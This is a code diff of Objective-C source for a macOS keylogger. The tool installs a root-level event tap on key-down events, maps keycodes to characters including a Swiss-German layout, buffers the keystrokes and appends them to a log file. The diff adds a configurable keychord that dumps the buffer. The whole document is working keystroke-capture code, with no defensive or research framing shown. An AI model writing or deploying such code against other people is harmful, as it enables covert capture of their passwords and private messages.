@@ -38,7 +38,8 @@
 */
 
 // Imports
-#include "config.h"
+#import "config.h"
+#import <objc/objc.h>
 #import <string.h>
 #import <Carbon/Carbon.h>
 #import <Foundation/Foundation.h>
@@ -46,14 +47,14 @@
 
 // Create event tap
 static CFMachPortRef eventTap = NULL;
-static char buf[BUFSIZE] = {0};
-static int bufIndex = 0;
+static NSMutableString *buf;
+
 
 // Colourful messages
 typedef struct {
-    const NSString* red;
-    const NSString* blue;
-    const NSString* reset;
+    const NSString *red;
+    const NSString *blue;
+    const NSString *reset;
 } Colours;
 const static Colours colours = {
     @"\x1b[31;1m",
@@ -62,8 +63,9 @@ const static Colours colours = {
 };
 
 // Fn decl
-NSString* keyCodeToString(CGEventRef event, CGEventType type);
-NSMutableString* extractKeyModifiers(CGEventRef event);
+NSMutableString *stringBuilder(NSString *keychord);
+NSString *keyCodeToString(CGEventRef event, CGEventType type);
+NSMutableString *extractKeyModifiers(CGEventRef event);
 CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref);
 void logma();
 
@@ -71,9 +73,9 @@ void logma();
  * @PARAM CGEventRef: event
  * @PARAM:CGEventType: type
  * @RVal NSString* */
-NSString* keyCodeToString(CGEventRef event, CGEventType type) {
+NSString *keyCodeToString(CGEventRef event, CGEventType type) {
     // init return val, status, keyCode &layout
-    NSString* keyChar = nil;
+    NSString *keyChar = nil;
     OSStatus status = !noErr;
     CGKeyCode keyCode = 0;
     CFDataRef layoutData = NULL;
@@ -101,7 +103,7 @@ NSString* keyCodeToString(CGEventRef event, CGEventType type) {
     status = UCKeyTranslate(layout, keyCode, keyAction, modifierState, LMGetKbdType(), 0, &deadKeyState, maxStringLength, &actualStringLength, unicodeString);
     if ((status != noErr) || (actualStringLength == 0)) { goto stop; }
     //init string
-    keyChar = [[NSString stringWithCharacters:unicodeString length:(NSUInteger)actualStringLength] lowercaseString];
+    keyChar = [[NSString stringWithCharacters: unicodeString length: (NSUInteger)actualStringLength] lowercaseString];
 stop:
     return keyChar;
 }
@@ -109,31 +111,31 @@ stop:
 /* getMods: Get the modifier keys
  * @PARAM CGEventRef: events
  * @RVal NSMutableString* */
-NSMutableString* extractKeyModifiers(CGEventRef event) {
+NSMutableString *extractKeyModifiers(CGEventRef event) {
     // Setup modifiers, flags
-    NSMutableString* keyModifiers = nil;
+    NSMutableString *keyModifiers = nil;
     CGEventFlags flags = 0;
     keyModifiers = [NSMutableString string];
     flags = CGEventGetFlags(event);
-    // Handlers: control
-    if(!!(flags & kCGEventFlagMaskControl) == YES) {
-        [keyModifiers appendString:@"ctrl"];
-    }
     // Handlers: alt
     if(!!(flags & kCGEventFlagMaskAlternate) == YES) {
-        [keyModifiers appendString:@"alt"];
+        [keyModifiers appendString: @"alt"];
+    }
+    // Handlers: caps lock
+    if(!!(flags & kCGEventFlagMaskAlphaShift) == YES) {
+        [keyModifiers appendString: @"caps"];
     }
     // Handlers: command
     if(!!(flags & kCGEventFlagMaskCommand) == YES) {
-        [keyModifiers appendString:@"cmd"];
+        [keyModifiers appendString: @"cmd"];
+    }
+    // Handlers: control
+    if(!!(flags & kCGEventFlagMaskControl) == YES) {
+        [keyModifiers appendString: @"ctrl"];
     }
     // Handlers: shift
     if(!!(flags & kCGEventFlagMaskShift) == YES) {
-        [keyModifiers appendString:@"shift"];
-    }
-    // Handlers: lock
-    if(!!(flags & kCGEventFlagMaskAlphaShift) == YES) {
-        [keyModifiers appendString:@"caps"];
+        [keyModifiers appendString: @"shift"];
     }
     return keyModifiers;
 }
@@ -146,7 +148,7 @@ NSMutableString* extractKeyModifiers(CGEventRef event) {
  * @RVal CGEventRef */
 CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref) {
     // Set vars
-    NSMutableString* keyMods = nil;
+    NSMutableString *keyMods = nil;
     // match type
     switch(type) {
         // Ignore mouse
@@ -171,7 +173,7 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
         // event tap timeout
         case kCGEventTapDisabledByTimeout:
             CGEventTapEnable(eventTap, true);
-            printf("%sErr ::%s Event tap timed out -> restarting tap\n", colours.red.UTF8String, colours.reset.UTF8String);
+            printf("%sErr%s :: Event tap timed out -> restarting tap\n", colours.red.UTF8String, colours.reset.UTF8String);
             return event;
         default:
             printf("%sUnknown%s\n", colours.red.UTF8String, colours.reset.UTF8String);
@@ -179,53 +181,54 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
     // Get keycode
     if ((kCGEventKeyDown == type) || (kCGEventKeyUp == type)) {
         // Hanle special keys
-        // shift, ctrl, alt, cmd, caps
-        if ([keyMods rangeOfString:@"cmd"].location != NSNotFound && [keyCodeToString(event, type) isEqualToString:@"ö"]) {
+        NSMutableString *dumpKeychord = stringBuilder([NSString stringWithUTF8String: DUMP]);
+        NSString *actualKeychord = [NSString stringWithFormat: @"%@%@", keyMods, keyCodeToString(event, type)];
+        if ([dumpKeychord isEqual: actualKeychord]) {
             logma();
         }
         // handle modifiers
-        if ([keyMods rangeOfString:@"shift"].location != NSNotFound || [keyMods rangeOfString:@"caps"].location != NSNotFound) {
+        if ([keyMods rangeOfString: @"shift"].location != NSNotFound || [keyMods rangeOfString: @"caps"].location != NSNotFound) {
             // special keys for swiss-german keyboard
-            if ([keyCodeToString(event, type) isEqualToString:@"."]) {
-                sprintf(buf + bufIndex, "%s", ":");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"-"]) {
-                sprintf(buf + bufIndex, "%s", "_");
-            } else if ([keyCodeToString(event, type) isEqualToString:@","]) {
-                sprintf(buf + bufIndex, "%s", ";");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"<"]) {
-                sprintf(buf + bufIndex, "%s", ">");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"'"]) {
-                sprintf(buf + bufIndex, "%s", "?");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"2"]) {
-                sprintf(buf + bufIndex, "%s", "\"");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"9"]) {
-                sprintf(buf + bufIndex, "%s", ")");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"8"]) {
-                sprintf(buf + bufIndex, "%s", "(");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"7"]) {
-                sprintf(buf + bufIndex, "%s", "/");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"6"]) {
-                sprintf(buf + bufIndex, "%s", "&");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"5"]) {
-                sprintf(buf + bufIndex, "%s", "%");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"4"]) {
-                sprintf(buf + bufIndex, "%s", "Ç");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"3"]) {
-                sprintf(buf + bufIndex, "%s", "*");
-            } else if ([keyCodeToString(event, type) isEqualToString:@"1"]) {
-                sprintf(buf + bufIndex, "%s", "+");
+            if ([keyCodeToString(event, type) isEqualToString: @"."]) {
+                [buf appendString: @":"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"-"]) {
+                [buf appendString: @"_"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @","]) {
+                [buf appendString: @";"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"<"]) {
+                [buf appendString: @">"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"'"]) {
+                [buf appendString: @"?"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"2"]) {
+                [buf appendString: @"\""];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"9"]) {
+                [buf appendString: @")"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"8"]) {
+                [buf appendString: @"("];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"7"]) {
+                [buf appendString: @"/"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"6"]) {
+                [buf appendString: @"&"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"5"]) {
+                [buf appendString: @"%"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"4"]) {
+                [buf appendString: @"Ç"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"3"]) {
+                [buf appendString: @"*"];
+            } else if ([keyCodeToString(event, type) isEqualToString: @"1"]) {
+                [buf appendString: @"+"];
             }
             else {
-                sprintf(buf + bufIndex, "%s", [[keyCodeToString(event, type) uppercaseString] UTF8String]);
+                [buf appendString: [keyCodeToString(event, type) uppercaseString]];
             }
-        } else if ([keyMods rangeOfString:@"ctrl"].location != NSNotFound) {
-        } else if ([keyMods rangeOfString:@"alt"].location != NSNotFound) {
-        } else if ([keyMods rangeOfString:@"cmd"].location != NSNotFound) {
+        } else if ([keyMods rangeOfString: @"ctrl"].location != NSNotFound) {
+        } else if ([keyMods rangeOfString: @"alt"].location != NSNotFound) {
+        } else if ([keyMods rangeOfString: @"cmd"].location != NSNotFound) {
         } else {
-            sprintf(buf + bufIndex, "%s", [keyCodeToString(event, type) UTF8String]);
+            [buf appendString: keyCodeToString(event, type)];
         }
-        bufIndex += strlen(buf + bufIndex);
-        if (strlen(buf)-1 >= bufIndex) {
+        /* printf("%lu\n", buf.length); */
+        if ([buf length] >= BUFSIZE) {
             logma();
         }
     }
@@ -233,17 +236,58 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
     return event;
 }
 
-/* log: log the buf contents to the logfile */
-void logma() {
-    FILE *fp;
-    fp = fopen(OUT_FILE_PATH, "a+");
-    if (fp == NULL) {
-        fp = fopen(OUT_FILE_PATH, "w+");
+/* stringBuilder format a keychord to the key format for comparison
+ * @Param NSString: keychord
+ * @RVal: NSMutableString */
+NSMutableString *stringBuilder(NSString *keychord) {
+    NSArray *keys = [keychord componentsSeparatedByString: @"+"];
+    NSMutableString *outString = nil;
+    if (!outString) {
+        outString = [[NSMutableString alloc] init];
     }
-    fputs(buf, fp);
-    fclose(fp);
-    bufIndex = 0;
-    memset(buf, 0, BUFSIZE);
+    for (NSString *key in keys) {
+        // initialize the string
+
+        [key stringByReplacingOccurrencesOfString: @" " withString:@""]; // somehow does not work
+        if ([key isEqual: @"alt"]) {
+            [outString appendString: @"alt"];
+        } else if ([key isEqual: @"caps"]) {
+            [outString appendString: @"caps"];
+        } else if ([key isEqual: @"cmd"]) {
+            [outString appendString: @"cmd"];
+        } else if ([key isEqual: @"ctrl"]) {
+            [outString appendString: @"ctrl"];
+        } else if ([key isEqual: @"shift"]) {
+            [outString appendString: @"shift"];
+        } else {
+            [outString appendString: key.lowercaseString];
+        }
+    }
+    return outString;
+}
+
+/* logma: log the buf contents to the logfile */
+void logma() {
+    if (DEBUG) {
+        printf("%sLogger%s :: Logging to file\n", colours.blue.UTF8String, colours.reset.UTF8String);
+    }
+    NSFileManager *manager = [NSFileManager defaultManager];
+    NSString *path = [NSString stringWithUTF8String: LOG_FILE_PATH];
+    BOOL fileExists = [manager fileExistsAtPath: path];
+
+    // create file if it does not exist
+    if (!fileExists) {
+        [manager createFileAtPath: path contents: nil attributes: nil];
+    }
+
+    // append buffer to file
+    NSFileHandle *handle = [NSFileHandle fileHandleForWritingAtPath: path];
+    [handle seekToEndOfFile];
+    [handle writeData: [[buf copy] dataUsingEncoding: NSUTF8StringEncoding]];
+    [handle closeFile];
+
+    // clear buffer
+    [buf setString: @""];
 }
 
 /* main: The main function 
@@ -251,6 +295,10 @@ void logma() {
  * @PARAM char**: argv
  * @RVal int */
 int main() {
+    // Initialize the buffer
+    if (!buf) {
+        buf = [[NSMutableString alloc] init];
+    }
     // event mask + loop
     CGEventMask eventMask = 0;
     CFRunLoopSourceRef runLoopSource = NULL;
@@ -258,15 +306,15 @@ int main() {
     @autoreleasepool {
         // check for root
         if(geteuid() != 0) {
-            printf("%sErr ::%s Service must be run as root\n", colours.red.UTF8String, colours.reset.UTF8String);
+            printf("%sErr%s :: Service must be run as root\n", colours.red.UTF8String, colours.reset.UTF8String);
             goto stop;
         }
-        printf("%sLogged ::%s logging...\n", colours.blue.UTF8String, colours.reset.UTF8String);
+        printf("%sLogged%s ::  logging...\n", colours.blue.UTF8String, colours.reset.UTF8String);
         // init event tap and mask
         eventMask = CGEventMaskBit(kCGEventKeyDown);
         eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, eventCallback, NULL);
         if(eventTap == NULL) {
-            printf("%sErr ::%s failed to create event tap\n", colours.red.UTF8String, colours.reset.UTF8String);
+            printf("%sErr%s :: failed to create event tap\n", colours.red.UTF8String, colours.reset.UTF8String);
             goto stop;
         }
         // setup runloop
